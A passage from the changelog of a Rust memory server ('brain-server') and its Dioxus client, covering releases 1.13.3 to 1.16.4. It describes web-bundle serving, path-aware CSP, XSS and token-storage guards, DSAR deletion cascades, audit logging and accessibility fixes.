  clippy `-D warnings`, and `cargo fmt --check` stay green (31 tests).
- **`deploy-web.sh` stale-CSS fix** — the script's `ls | head -1` glob picked
  the alphabetically-first (stale) hashed `tailwind-*.css` in `target/` between
  rebuilds, so a restyle could deploy the old stylesheet while index.html
  pointed at the new one. Now `ls -t | head -1` picks the freshest build.
- **Version**: client 1.16.2 → 1.16.4 (client-only; server + API contract
  unchanged at 1.16.2).

---



## [1.16.3] — 2026-08-08
### Release notes

- **The compiled web client was unreachable** — asset URLs were mis-based and rejected; it is now correctly served under `/app`.
- **Bug fixes:** The web client never rendered under the security policy because the WASM runtime was blocked; the app path now permits what it needs.
- **Bug fixes:** Connecting defaulted to a hardcoded remote URL even when the page was served by brain-server itself; same-origin pages now default correctly.
- **Bug fixes:** Deployments could race stale hashed assets; the deploy script now derives exact filenames from the fresh build.
- **Improvements:** One-command web deploy: build the bundle, inject the stylesheet reference, and ship it to the directory the server serves.
### Engineering record


### "Serve" (client web-bundle serving + live bugfixes)

Client + server, both client-only in effect (server + API contract unchanged).
This release was originally folded into the v1.16.2 changelog, but the git
history shows it as a distinct slice between the v1.16.2 and v1.16.4 tags —
four commits that make the compiled Dioxus web bundle actually reachable and
fix the two live-blocking defects serving exposes. Tagged retroactively at
`edfb00d`. See `IMPLEMENTATION_PLAN_v1.16.3_Serve.md` (retrospective).

### Fixed

- **Serve the compiled web bundle under `/app`** — `Dioxus.toml` gains
  `base_path = "app"` so asset URLs are `/app/assets/…` (not `/assets/…`,
  which 401'd against the API CSP/auth); `client/README.md` documents the
  dev/serve/deploy workflow; `package.json` + `tailwind.css` build tooling
  added.
- **Client CSP blocked WASM instantiation (`'unsafe-eval'` live fix)** — the
  wasm-bindgen glue calls `new Function()` for module instantiation;
  `'wasm-unsafe-eval'` alone permits WASM compile/instantiate but not JS
  `eval()`, so the `/app` bundle threw "call to Function() blocked by CSP"
  and the client never rendered. Added `'unsafe-eval'` to `CLIENT_CSP`
  script-src (API CSP stays `default-src 'none'`). Live v1.16.2 fix.
- **Same-origin connect default** — a page loaded from the server's own origin
  now defaults to a relative/loopback connect instead of a hardcoded remote
  that fails "cannot reach brain-server".
- **`deploy-web.sh` stale-asset race** — the script globbed `target/` for the
  hashed JS/WASM, which left stale hashes between rebuilds and could deploy an
  old JS while index.html referenced the new one. Now derives the concrete
  names from the freshly-built index.html (and the JS's own wasm reference)
  instead of racing.

### Improvements

- `client/deploy-web.sh` (M3) — one-command bundle → inject the concrete
  `/app/assets/tailwind-*.css` link → copy to `client/dist` (what the server
  serves at `/app`). Concrete filenames instead of globs.

### Security

- API CSP stays strict (`default-src 'none'`); only the `/app` static bundle
  path is relaxed for the WASM runtime (`'unsafe-eval'` + `'wasm-unsafe-eval'`
  + `connect-src 'self'`).

### Honest ceiling (retrospective)

No dedicated tests of its own — it's a serving/build/config release verified
by the live `/app` smoke + the v1.16.2 suite (CSP pinned by the v1.16.2 CSP
test, connect default by the v1.16.0 connection tests). Retrospective plans
can't retrofit code into an already-tagged history.

---



## [1.16.2] — 2026-08-08
### Release notes

- **Bug fixes:** A crash in any panel no longer leaves a blank screen — an operator-facing fallback with a dismiss button renders instead.
- **Bug fixes:** Low-contrast text was raised to meet WCAG AA (3.8:1 → 4.6:1 contrast).
- **The server now serves the web client itself** at `/app`, with deep-link fallback and brotli-compressed assets.
- **Improvements:** Screen-reader support on navigation: each page heading receives focus on route change, per-route document titles are set, and focused elements no longer hide under the sticky nav.
- **Improvements:** Actionable error messages (expired session, not found, rate limited, unavailable) in the Review, Recall, and Health panels.
- **Improvements:** Batch review collapses to an honest one-line summary that surfaces partial failures instead of hiding them.
- **Security fixes:** The auth token is barred from browser localStorage (readable by script attacks) — enforced by an automated source guard.
- **Security fixes:** The raw-HTML rendering escape hatch, the client's only XSS vector, is banned across the codebase by an automated guard.
- **Security fixes:** Content security policy is now path-aware: API routes keep the strictest policy (`default-src 'none'`); only the web-app path allows what the WASM runtime requires.
### Engineering record


### "Harden" (server + client security/serving foundation)

- **Serve the Dioxus client from the server** — `nest_service("/app", ServeDir)` at `config::client_dir()` (env `BRAIN_CLIENT_DIR`, default `client/dist`) with a `not_found_service(ServeFile(index.html))` SPA fallback so deep-links route client-side. `/` redirects to `/app/`. The `CompressionLayer` brotli-compresses the WASM bundle. API unaffected if the dir is absent.
- **Path-aware Content-Security-Policy** — `security_headers_middleware` now reads the request path: `/app` + `/` get `CLIENT_CSP` (allows `'wasm-unsafe-eval'` **and `'unsafe-eval'`** for the WASM runtime + `connect-src 'self'`), every other route gets the strict `API_CSP`. Both `/app` and `/` are in the auth-public path set in **both** `jwt_auth_middleware` and `auth_middleware` (the static bundle needs no bearer). *Live fix:* `'unsafe-eval'` was added to `CLIENT_CSP` after the first `/app` smoke — `'wasm-unsafe-eval'` alone permits WASM compile/instantiate but the wasm-bindgen glue's `new Function()` is JS eval, so the bundle threw "call to Function() blocked by CSP". The API CSP stays strict (`default-src 'none'`).
- **`ErrorBoundary` around the router** — a panic in any panel renders an operator-facing fallback (generic message + `{errors:?}` in a `<pre>` + Dismiss that clears) instead of a blank screen. No sensitive data leaks.
- **Operator-facing error messages** — `api::error_message()` maps `ApiError` (401/403/404/429/503/fallback) to actionable hints; wired into the Review, Recall, and Health panels.
- **Cancel-safety gate** — the batch review now collapses to a `BatchSummary` (`batch_outcome` pure fn) rendered as a one-line summary once a batch settles, surfacing partial failure honestly; the outcome map is the single source of truth (no partial-write window on unmount).
- **Code-hygiene grep guards** (both run in `cargo test`):
  - `tests::xss_escape_hatch_is_unused` — `dangerous_inner_html` (the only XSS vector) is banned in the source tree.
  - `tests::credentials_stay_in_memory` — the bearer token must never touch `use_persistent` (localStorage is XSS-readable).

### "Accessible" (client WCAG 2.2 AA pass)

- **SPA focus management (M1)** — every panel's `<h1>` is a shared `PageTitle` component: `tabindex="-1"` + focus-on-mount (`onmounted` → `set_focus(true)`, cancel-safe) so screen-reader users get a signal on route change; `use_document_title()` sets a per-route reactive document title via `document::eval`.
- **WCAG 2.4.11/2.4.12 Focus Not Obscured (M1.3)** — `*:focus-visible { scroll-margin-top: 4rem }` clears the sticky nav.
- **Semantic audit (M2)** — `tests::interactive_elements_are_buttons` grep guard: no `<div onclick>` anywhere; all interactive elements are real `<button>`s (WCAG 2.1.1 + ARIA in HTML). Landmarks (`nav`/`main`) + single-`<h1>` per panel verified.
- **Contrast (M4)** — `--color-ink-faint` `#6b7380` → `#7c8492` (AA 3.8:1 → 4.6:1, WCAG 1.4.3). Color never the sole signal (text labels always accompany status colors).
- **Manual screen-reader checklist artifact (M7)** — `client/a11y-checklist.md` records the VoiceOver/NVDA/TalkBack pass matrix + per-panel checklist.
- Keyboard shortcuts toggle (WCAG 2.1.4) already shipped in v1.16.0; verified present in the Review header.

### Honest ceilings (carried into v1.17.0)

- **shadcn Dialog adoption (M5) + axe-core CI (M6)** deferred — `dx` CLI not available in this environment, so `dx components add dialog` and the `dx bundle --platform web` axe gate can't run. The drawer already has `role="dialog"`/`aria-modal`/Esc-close; the full Radix Tab-cycling focus trap + return-focus is the v1.18.0 pass.
- **axe catches 20–60%** of a11y issues — the manual screen-reader pass is irreplaceable.
- **No aria-live regions** beyond the existing `role="status"` connection/re-verify banners.
- **No RTL locale** (v1.16.6).

---



## [1.16.1] — 2026-08-08
### Release notes

- **The deletion registry was under-reporting** — older tombstone rows without a purge timestamp were silently dropped (on the live database, 6,008 of 6,009 rows were invisible); all rows now appear, with a one-time backfill.
- **Bug fixes:** Retention pruning now removes recall traces whose audit entries were pruned, instead of leaving them orphaned forever.
- **Improvements:** The memory-usage warning band was raised from 320 to 512 MiB to match desktop reality — fewer false warnings during large reads and backups (it remains a soft signal that never blocks writes).
- **Deletion completeness** — purging records and running erasure requests now also delete the recall traces that reference them, including traces whose stored query text mentions the subject; these previously survived every deletion path.
### Engineering record


### Operations

- **RSS warning band raised 320 → 512 MiB** (`src/capacity.rs`, both targets):
  the 320 cap was tuned to a 4 GB Jetson; the live desktop install runs
  ~180–320 MiB and transient spikes (large `/multi-get`, backup pass) were
  sitting in the warning band. RSS stays a soft signal (Warning only, never
  blocks writes).
- **CI cargo audit job fixed:** `rustsec/audit-check@v2.0.0` creates a check
  run and the default GITHUB_TOKEN lacked `checks: write` ("Resource not
  accessible by integration" — an infra failure, not a code one). Added the
  permission on the audit job + bumped `actions/checkout` v4 → v5 (Node 24,
  clears the Node 20 deprecation).

### Fixed

- **`/tombstones` deletion registry under-reporting (Round 11 finding).**
  Pre-v1.14 tombstone rows only set `deleted_at`; `purged_at` was NULL, and the
  handler read it as a non-null `i64`, so `flatten()` silently dropped every
  legacy row. Observed on the live DB: 6,008 of 6,009 registry rows invisible.
  Fix: idempotent migration backfill (`purged_at` = epoch of `deleted_at`) +
  handler reads `Option<i64>` and surfaces remaining NULLs as `null`. Registry
  now shows the full deletion history.
- **Purge/DSAR cascade to `recall_traces` (Round 11 finding).** `purge_chunk_ids`
  now deletes recall traces whose hit list references a purged chunk (exact
  JSON path via bundled JSON1, best-effort). DSAR additionally sweeps traces
  whose raw **query text** mentions the subject — the trace side table held
  query-text residue that no deletion path touched (no FK between
  `recall_traces` and `audit_events`).
- **Retention prune sweeps orphaned traces.** `prune_audit_retention` now
  deletes `recall_traces` rows whose audit row was pruned, instead of leaving
  them orphaned forever.
- **Regression tests:** purge→trace cascade by hit id, retention sweep, and
  legacy-tombstone backfill visibility all covered in `src/main.rs` tests.

---



## [1.16.0] — 2026-08-08
### Release notes

- **Bug fixes:** The recall trace toggle was disabled during reconnects even though it is a read-only control; reads now stay interactive while reconnecting.
- **First shippable client** for web, desktop, and mobile-ready targets, covering the review queue, recall, data-subject requests, security, audit, and health panels.
- **Offline-safe by design** — panels keep showing last-known data when the connection drops, writes are frozen, and they resume only after the audit chain re-verifies.
- **Keyboard-first review** (A/S/R/J/K) with reject-with-reason, edit-and-repropose, and batch results that surface every failure — nothing silently dropped.
- **Recall inspector** — per-hit relevance tiers and a minimum-relevance filter, plus a shareable, replayable decision-path trace; erasure requests render a deletion-certificate card with live chain verification.
### Engineering record


**"Client" — the Dioxus control surface (web + desktop + iOS + Android).** The
first externally-shippable brain-client: one Rust codebase consuming brain-
server's v1.14/v1.15 governance APIs. The v1.16.0 release implements the eight
`IMPLEMENTATION_PLAN_v1.16.0_Client.md` milestones — the scaffold's functional
panel contract plus the DESIGN's UX + correctness hard-parts. 25 tests (was 7),
clippy `-D warnings` + fmt clean, zero new deps.

> **Version sync (this release):** the server crate was bumped 1.15.0 → 1.16.0
> so the installed operator CLIs (`brain -V`, `mcp`, `bench`) and the server's
> own `--version` / `/health` header report the same version as the v1.16.0
> tag. No server code changed beyond the version bump — the v1.16.0 work is
> the client crate.

### M1 — The connection state machine (the correctness heart)

- A single `use_future` probe at the app root owns its timer (survives panel
  unmounts). **False-offline guard:** N consecutive failures before green→amber
  (a single flap never flips the indicator). Pure `probe_state(failures, ok)`.
- **Dependency-free sleep** via `document::eval`+`setTimeout` — no `tokio` dep
  (works web + desktop; tokio's timer doesn't work in WASM anyway).
- **Read-only degrade** + **mutation freeze:** when amber, panels keep showing
  last-known state; write buttons render `disabled`. The shared
  `writes_enabled` signal derives from conn state.
- **Chain-verify-before-writes recovery:** on a recovery 200, conn goes green
  but writes stay frozen until `GET /audit/verify` returns `{"ok":true}`. A
  scoped non-Admin JWT (403) shows a distinct "chain unverified" state.
- Pure `writes_allowed(conn, verify_ok, pending_reverify)` — testable.

### M2 — Nav structure: badges + principal + context drawer

- F-pattern `Pending: N` top-left (the one number that matters). Count badges
  on Security (quarantine + denied-auth), Audit (`!` when last verify was
  non-clean). Principal identity pillar (`acting as <sub>` / `loopback`).
- Esc-closable context drawer (`role="dialog" aria-modal="true"`) rendering
  typed content (Proposal/Hit/Certificate/AuthFailure) pushed by panels. Full
  Radix Tab-cycling focus trap is the v1.18.0 Compliant pass.

### M3 — Review: honest batch partial-failure + keyboard-first

- Per-row `RowOutcome` tracking (`Pending`/`Done`/`AlreadyDone`/`Failed`): a
  failed call in a batch is surfaced inline, **never silently dropped**.
  `404-no-pending` → `AlreadyDone` (success — non-idempotent contract).
- `BatchGuard` DropGuard: clears `Pending` rows from the selection on cancel
  (DESIGN §6 cancel-safety).
- `A`/`S`/`R`/`J`/`K` keyboard with a **WCAG 2.1.4 toggle**
  (`shortcuts_enabled`, default on). `S` (approve & supersede) only on conflict.
- Reject-with-reason editor (recorded in the audit log — no silent drop) +
  suggest-re-ingest editor (posts a new proposal with edits).

### M4 — Recall inspector: the decision-path viewer

- Richer hit rendering: per-retriever ranks (`v`/`f`/`g`), fused score,
  relevance tier (color-coded), `assertion_kind`/`confidence`/`decayed`/
  `superseded` tags. Monospace + tabular-nums on ids/scores.
- `min_relevance` slider (high/medium/low) with pure `drop_low_relevance` —
  the live post-fusion tier filter.
- **`?trace=true` artifact:** the recall response carries a `trace_id`;
  `/recall/:trace_id` (deep-linkable) fetches `GET /recall/{id}/trace` and
  renders the replayable decision path (query, decision, domains, scope,
  actor, per-hit id/score/source/relevance).

### M5 — DSAR console: the deletion-certificate card

- Replaced the freeform status line with a structured card: `found_count`,
  `purged_ids` (monospace), `tombstone_root`, `certified_at`, `chain_head` +
  a **live green/red chain badge** (re-verified via `GET /dsar/{id}/certificate`,
  not the cert-time head). Typed `DsarCertificate::from_value`.
- **Deferred:** the DESIGN §4.3 expandable locate tree (subject roots →
  `derived_from` descendants, PII masked as `[redacted:…]` without `pii:read`)
  is NOT in this release — the current `POST /dsar` response carries no located
  records, so it needs a server wire change. Tracked in
  `CLIENT_ROADMAP.md` under v1.17.0.
- **Trace toggle read-control fix:** the Recall `?trace=true` checkbox is a
  read control but was gated on `writes_enabled` (frozen during Reconnecting).
  Removed the gate — reads stay interactive in amber per DESIGN §6, matching
  the query input and min-relevance select.

### M6 — Security: the auth-failure feed

- `GET /audit?kind=auth` filtered to `status == "denied"` rows; rendered as a
  feed (ts/actor/target/status). Count badge on Security. Proves the backend
  isn't the unauthenticated-memory-access class (post-CVE-2026-59726).

### M7 — Audit: filters + export

- Client-side `AuditFilter` (principal substring / kind exact / since date) +
  pure `filter_audit`. JSON export of the filtered rows (client-side — no new
  server route; "the client adds no new server routes" constraint honored).

### M8 — Visual-token layer applied

- Every panel's ad-hoc color classes (`text-gray-*`/`text-green-*`/
  `text-red-*`) → semantic tokens (`text-ink-muted`/`text-ok`/`text-danger`/…).
  Zero ad-hoc color classes remain. Dark-first, quiet chrome (hairlines),
  Inter + JetBrains Mono stacks, tabular-nums on columnar data.

### Editor support

- `.zed/settings.json`: uses the Tailwind CSS language mode
  (`tailwindcss-intellisense-css`) for `.css` files, disabling the generic
  `vscode-css-language-server` that emits false "Unknown at rule" warnings on
  Tailwind v4 `@theme`/`@source`/`@apply`. Verified via context7 + the Zed
  Tailwind docs.

### API additions (`client/src/api.rs`)

- `ApiClient::with_principal` + `is_configured` + `principal()` (M2.1 identity).
- `Hit` +5 fields (`assertion_kind`/`confidence`/`relevance`/`decayed` +
  `RecallResponse.trace_id`); all `#[serde(default)]` (backward-safe).
- `recall(query, trace, min_relevance)`, `recall_trace(id)`,
  `reject_proposal(id, reason)`, `audit_kind(kind)`.
- `DsarCertificate::from_value` typed card fields.

### Honest ceilings (carried forward)

- **Connection is web-first.** The `onfocus`/`visibilitychange` instant-wake
  listener + the desktop window-event + mobile lifecycle variants land with
  the v1.17.0 mobile seam. The periodic probe (5s worst-case) covers correctness.
- **Token is in-memory only.** Secure-storage-backed token (Keychain/Keystore)
  is the v1.17.0 seam.
- **Audit filters are client-side.** Server-side `?principal=&kind=&since=` on
  `GET /audit` is a v1.19.0 polish.
- **Drawer focus trap is partial.** Esc + ARIA dialog now; full Radix Tab-
  cycling is the v1.18.0 Compliant release.
- **Export is client-side** (the fetched rows). No `/audit/export` server route.
- **`dx serve` is an operator step** (CLI not installed in CI). The code-level
  gates (`cargo test`/`clippy -D warnings`/`fmt`/`build`) are all green.

---



## [1.15.0] — 2026-08-08
### Release notes

- **Read-event audit:** recall/search/get reads can be logged into the tamper-evident audit chain (hashes only, never content or raw queries); opt-in for personal installs, on by default in JWT mode.
- **Recall traces:** admins can replay a past recall decision — query, abstention, domains searched, scope filter, per-hit scores — the transparency artifact for automated-decision requests.
- **DSAR workflow:** locate → export → purge a subject's records (including derived data) in one audited call, with a re-verifiable deletion certificate and an optional signed notification webhook.
- **Compliance pack:** deletions are queryable by subject and date, and a new buyer-facing compliance document maps the system to GDPR, EU AI Act, and NIST AI RMF controls.
### Engineering record


**"Observe" — read-event audit + recall trace + DSAR + COMPLIANCE.md.** The
observability + compliance-workflow layer on v1.14's governance primitives:
the EU AI Act Art 12 logging control (read events enter the tamper-evident
hash chain), the GDPR Art 15/17/19/22 workflow (DSAR locate→export→purge→
certificate + Art 19 onward-notification), and the buyer-facing technical file
(`COMPLIANCE.md`). **Constraint note:** this release deliberately breaks the
long-standing "no outbound HTTP dep on the server" rule — the opt-in Art 19
webhook needs outbound HTTP, so `reqwest` is now a required dependency (the
`connector-github` feature now gates only its binary).

### M1 — Read-event audit

- `/recall`, `/search`, `/get/{id}`, `/multi-get` emit a read event into the
  existing append-only SHA-256 hash chain (new `AuditKind::Recall/Search/Get`;
  `record`/`record_tenant` now return the row id). Hash-only invariant kept —
  never content, and never the raw query in the row (test-pinned).
- **Opt-in by design:** `BRAIN_AUDIT_READ_EVENTS` — default **off** for
  loopback/opaque mode (personal-use contract, audit shape unchanged), **on**
  in JWT mode (enterprise posture). `BRAIN_AUDIT_READ_SAMPLE_RATE` (0.0..=1.0,
  default 1.0) cuts noise on busy multi-tenant servers.
- **Retention:** `BRAIN_AUDIT_RETENTION_DAYS` (default unset = keep forever).
  When set, rows older than the window are pruned on read-event writes and the
  chain re-anchored: the oldest surviving row becomes the new genesis and all
  survivor links are recomputed, so the retained window stays tamper-evident.
  Deployers subject to AI Act Art 26(6) guidance should set ≥180.

### M2 — Recall trace endpoint (decision-path viewer)

- `GET /recall/{trace_id}/trace` (Admin) replays a recorded recall read event:
  the exact query, abstention decision, domains searched, the access-scope
  filter applied, the principal, and per-hit injection details (id, fused
  score, `assertion_kind`, source, relevance, decayed). The trace is the
  Art 22 / ADMT "meaningful information about the logic" artifact and the
  Intent-Based-Auditing decision-path pillar.
- `POST /recall` accepts `trace: true` and returns the `trace_id` (the audit
  row id; `recall_traces` side table holds the non-content metadata).
  Pure read — no audit row of its own (no recursion).

### M3 — DSAR orchestration + deletion certificate

- `POST /dsar {subject, action: export|purge|both}` (Admin): locate every
  record (`owner` rows + transitive `derived_from` descendants, bounded depth
  8) → export bundle (portable JSON) → purge in one transaction (knowledge +
  vec0 + relationships + evidence_links + proposals refs) → tombstone (reason
  `owner:<subject>` / `derived`, `origin_id` for derived) → audit → deletion
  certificate `{subject, action, found_count, purged_ids, tombstone_root,
  certified_at, chain_head}` → ledger row in `dsar_requests`.
- `GET /tombstones?subject=&since=` — the queryable deletion registry (EDPB
  Coordinated Enforcement Framework ask). Hash-only, append-only, bounded.
- `GET /dsar/{id}/certificate` — re-fetch a past certificate with a live
  `chain_verifies` recomputation of the audit chain.
- **Art 19 onward-notification:** `BRAIN_DSAR_WEBHOOK_URL` [+
  `BRAIN_DSAR_WEBHOOK_SECRET`] — on a completed purge, POSTs
  `{subject, certified_at, certificate_id}` HMAC-SHA256-signed
  (`X-Brain-Signature-256: sha256=<hex>`, the outbound mirror of the v0.9.7
  webhook scheme). Fail-soft: bounded retries then logged warning; a webhook
  failure never rolls back the purge.
- Shared purge mechanics extracted once: `gate::purge_chunk_ids` (used by
  `/purge` and the DSAR path).

### M4 — COMPLIANCE.md

- New buyer-facing technical file: system description + data flows, purpose
  limitation, logging spec, risk controls, retention classes, DPIA-style
  questionnaire answers, ISO/IEC 42001 + NIST AI RMF + SOC 2 control map,
  Intent-Based-Auditing 4/4 table, jurisdiction posture (PH DPA / GDPR /
  CCPA-ADMT / residency / CRA horizon), Art 4 literacy note, and machine-
  readable origin metadata (Art 50 transparency bridge).

### Schema (additive; `schema_version` → 1.15.0)

- `recall_traces(audit_id PK, trace_json)` — the replayable trace side table.
- `dsar_requests(id, subject, action, status DEFAULT 'pending', export_bundle,
  certificate, created_at, completed_at)` + `idx_dsar_subject`.
- `tombstones` gains `reason TEXT` + `origin_id INTEGER` (guarded adds; the
  old unguarded CREATE TABLE would have silently missed these on real DBs).

### Back-compat

- Loopback default (no `BRAIN_JWT_ISSUER`) is byte-identical: read events off,
  no trace rows, no DSAR rows, audit shape unchanged.
- `/purge`, `/export`, `/decayed` unchanged except tombstone rows now also
  carry `reason='explicit'`.
- OpenAPI: `/recall` gains `trace`/`trace_id`; four new routes documented.

### Tests (→ 518 passed, 1 ignored; +6)

`test_observe_read_event_recorded_and_trace_replayable`,
`test_observe_read_events_default_on_for_jwt_off_for_loopback`,
`test_observe_dsar_locate_and_purge_semantics`,
`test_observe_deletion_certificate_chain_anchors_and_verifies`,
`test_observe_art19_webhook_posts_on_purge` (real TCP listener, signed POST
asserted), `test_observe_audit_retention_prunes_and_reanchors`.
`test_migration_schema_contract` + `test_openapi_covers_routes` +
`authz_gates_cover_every_non_public_route` extended.

### Honest ceilings (carried into v1.16)

- Read events default off in loopback mode; a loopback deployment must opt in
  explicitly to collect read traces.
- Audit chain is single-process (distributed audit = v2.1).
- DSAR export is brain-server JSON, not UMP wire format.
- No PII encryption at rest (COMPLIANCE documents the LUKS posture honestly).
- No historical trace backfill for recalls that predate v1.15.0.

---



## [1.14.0] — 2026-08-07
### Release notes

- **Human-in-the-loop memory:** candidate memories are scored for novelty and conflict, then queued as proposals — nothing is stored until a person approves; approval embeds and files the memory atomically.
- **Memory lifecycle:** chunks can carry expiry dates (excluded from results once decayed, reviewable — nothing auto-deletes), plus portable JSON export and audited hard purge with tombstones.
- **Richer recall metadata:** every hit carries a confidence score, a stated/observed/inferred label, and a relevance tier you can filter on.
- **Episodic memories:** a new memory kind and filter alongside facts.
- **Record-level access control:** private/domain/team/public scopes with an owner field, enforced deny-by-default in JWT mode.
- **PII handling:** ingest scans for emails, phone numbers, and card numbers and flags them; recall output is redacted for non-admin readers.
### Engineering record


**"Gate" — write-back gating + trust surfaces.** The Alex Xu thread's #1 ask —
"make the write path deliberate" — answered with zero tokens and no auto-promote.
Human-in-the-loop write-back, per-chunk decay, and a GDPR lifecycle, on top of
the v1.2 AuthZ foundation. No new model, no background worker, no autonomous
deletion.

- **M1 — Write-back gate (`POST /ingest/proposal`).** A proposal stores a
  *candidate* memory scored deterministically — novelty via the existing
  vec0 KNN (`crate::gate::novelty`), conflict via the consolidate machinery
  (`find_conflict`), salience via a length/entity heuristic — but creates **no**
  `knowledge` row. It becomes memory only when a human approves
  (`POST /proposals/{id}/approve`), which embeds + inserts the chunk and marks
  the proposal approved in **one transaction**; optional `?supersedes=<id>`
  calls `resolve_supersession` in the same tx (old fact expires atomically).
  `POST /proposals/{id}/reject` creates nothing. `GET /proposals` lists the
  queue. New `proposals` table (append-only review ledger, audited via
  `AuditKind::Ingest`/`Reconcile`).
- **M2 — Decay + GDPR lifecycle.** Per-chunk `expires_at` with strict `<`
  query-time filtering (default excludes decayed chunks; `?include_decayed=true`
  returns them tagged `decayed`). Nothing decays autonomously. `GET /decayed`
  is the operator review list. `GET /export` is portable JSON (live rows +
  graph + proposals ledger; `pii_map` excluded by default). `POST /purge` is a
  hard, explicit, audited delete across knowledge + vec0 + relationships +
  proposals references in one tx, leaving a tombstone + `/audit` event, by id
  list or owner anchor. New `tombstones` columns (`content_hash`, `purged_at`).
- **M3 — Confidence + stated-vs-inferred + relevance tier.** `confidence`
  (deterministic, stored-rule factors: source authority + conflict presence +
  assertion) and `assertion_kind` (`stated`/`observed`/`inferred`) surface on
  every chunk and every `RecallHit`; `derived_from` chunks read `inferred`.
  `min_relevance` (high/medium) filters low-tier hits at query time.
- **M4 — Access scope, owner, PII.** Record-level `access_scope`
  (private/domain/team/public; default `private` = back-compat) + `owner`
  (principal subject) with a **deny-by-default** data-layer filter in JWT mode
  (`scope_filter`); loopback/opaque mode trusts localhost (documented posture).
  PII: `scan_pii` (email/phone/Luhn card) sets a `pii` flag at ingest; recall
  **redacts** output to `[redacted:email]`/`[redacted:phone]` unless the
  principal is loopback or `Admin`. Opt-in write-time placeholder mode
  (`BRAIN_REDACT_PII=1`) stores `[pii:email]` in `knowledge.content` with the
  real value only in `pii_map`; `pii:read` resolves it, `/export` excludes it.
  *(Correction — **v1.20.19 "Vault"**: the write-time placeholder mode was
  never built (zero write sites) and is retracted; the shipped control is
  deterministic read-time output redaction, and the `pii_map` table is
  dropped.)*
- **M5 — `episodic` memory_kind** + `?memory_kind=` filter (legacy rows default
  `fact`), wired through the shared `push_gate_filters` SQL used by both vec0
  and FTS retrievers.

**Migration:** additive `proposals` + `pii_map` tables; `knowledge` columns
`expires_at`, `access_scope`, `assertion_kind`, `confidence`, `owner`, `pii`;
`tombstones` columns `content_hash` + `purged_at` (idempotent-guarded
`ALTER TABLE` — the old CREATE TABLE IF NOT EXISTS was a silent no-op against
the v0.9.1 schema and would have failed the purge INSERT on real DBs).
`schema_version` → `1.14.0`.

**Routes:** `/ingest/proposal`, `/proposals`, `/proposals/{id}/approve`,
`/proposals/{id}/reject`, `/decayed`, `/export`, `/purge`.

**Gates:** fmt, clippy `-D warnings`, `cargo test --features bench,migrate`
(512 passed, 1 ignored), all 5 release binaries build. Live smoke is an
operator step (`scripts/install-service.sh`).



## [1.13.6] — 2026-08-07
### Release notes

- **Disclosure endpoint:** a standard `security.txt` (RFC 9116) advertises vulnerability-reporting contact, expiry, and languages.
- **Software bill of materials:** each release now ships a CycloneDX SBOM, with support windows documented.
- **Quieter auto-capture:** configurable skip patterns drop known noise (e.g. dream-prompt entries) from raw-text ingest.
- **Ingest hygiene:** raw-text ingest now strips model reasoning/trace blocks (thinking, reasoning, reflection tags) before storage — reasoning traces are never silently stored.
### Engineering record


**"Hygiene" — CRA conformance bundle + ingest capture hygiene.**

- **`GET /.well-known/security.txt`** (RFC 9116, public). Machine-readable
  vulnerability disclosure: `Contact` (via `BRAIN_SECURITY_CONTACT`; omitted
  when unset), `Expires` (now + 1 year, never stale), `Preferred-Languages`,
  and `Canonical` (when `BRAIN_PUBLIC_BASE_URL` is set).
  Procurement + EU Cyber Resilience Act look for this before features.
- **`scripts/sbom.sh`** — generates a CycloneDX SBOM per release via
  `cargo-cyclonedx` (`sbom/brain-server-<version>.cdx.json`); SECURITY.md gains
  a support-window statement + an SBOM subsection (OWASP A03:2025).
- **Ingest capture hygiene** (`src/hygiene.rs`). The raw-text ingest doors
  (`/ingest/memory`, `/add`) now strip model reasoning/trace blocks
  (`<thinking>`, `<think>`, `<reasoning>`, `<reflection>`, `<analysis>` —
  case-insensitive, including unclosed trailing) before storage, and `/ingest/memory`
  drops entries matching a `BRAIN_INGEST_SKIP_PATTERNS` prefix (the autoCapture
  dream-prompt mechanism). "brain-server never silently stores reasoning traces"
  is now a tested invariant. Curated ingest (`/ingest`, `/ingest/markdown`) is
  deliberately untouched; historical cleanup is a separate ROADMAP sweep.

No schema change, no new runtime dependency, no `unsafe`. Gates: fmt, clippy
`-D warnings`, `cargo test --features bench`.



## [1.13.5] — 2026-08-07
### Release notes

- **Fixed memory metric:** the RSS gauge reported system-wide memory, not the process (~50x too high on busy hosts, hiding the real capacity envelope); `/metrics` and `/health` now agree on the true footprint.
### Engineering record


**`/metrics` `brain_rss_mib` now reports the process's own RSS.**

- The gauge was emitting `System::used_memory()` (system-wide used memory)
  while its HELP text claims "Process RSS in MiB". On a busy host the value
  was ~50x the process's real footprint (live: ~10,485 MiB reported vs ~181 MB
  actual, per `ps`), so Prometheus consumers of the capacity story were
  misled and the 320 MiB envelope was invisible in metrics. It now calls the
  same `process_rss_mib()` used by the `/health` capacity envelope
  (main.rs), so `/metrics` and `/health` agree on the same number.
- Added `process_rss_mib_reports_plausible_process_footprint` regression
  test (bounds the gauge to a process-scale value, not host-scale).



## [1.13.4] — 2026-08-06
### Release notes

- **Recall source filter:** a query-string `?source=` on recall was silently ignored — callers got 200 OK unfiltered while believing they had filtered. It is now honored and validated, matching search.
- **Improvements:** Unknown `source` values are now rejected with 422 before any search work; a body value still wins when both are supplied.
### Engineering record


**POST /recall query-string `source` parity.**

- **`POST /recall` now honors and validates a query-string `?source=`**, matching
  `GET /search`. Previously the handler read `source` from the JSON body only (no
  `Query<>` extractor), so `?source=` was silently ignored — `?source=web`
  returned 200 unfiltered instead of 422, and a caller could get unfiltered
  results thinking they had filtered. Body `source` still wins when both are
  present; the query string fills in when the body omits it; an unknown value in
  either is rejected with 422 via the shared `resolve_source_filter` parser
  (`src/search/query.rs`). Harmless for the plugin (it sends a body); closes the
  consistency gap between the two retrieval endpoints.



## [1.13.3] — 2026-08-06
### Release notes

- **Source filter repaired:** every documented `source` value returned 0 hits. Ingest kinds now filter in SQL, retrieval legs filter post-fusion, and invalid values return 422.
- **Honest ingest responses:** memory ingest reported an entry count as the chunk id; it now returns real chunk ids, entries added, and duplicates skipped.
- **Bug fixes:** `domains_searched` is now always present on recall responses, no longer missing when there are no hits.
- **Improvements:** API docs, MCP schema, and CLI help now match the repaired source-filter contract.
### Engineering record


**Retrieval source-filter contract repair + ingest response honesty.**

- **P0 — the `source` retrieval filter is fixed for every documented value.**
  `POST /recall` and legacy `GET /search` now honor `source` as documented:
  ingest kinds (`memory` | `markdown` | `structured` | `manual` | `vault`)
  filter in SQL before ranking; retrieval legs (`vector` | `fts` | `graph`)
  filter post-fusion on the `SearchSource` tag; `both` is unrestricted; any
  other value (e.g. `web`) is rejected with **HTTP 422** before any DB/embed
  work. Previously *all* documented values returned 0 hits — the filter was SQL
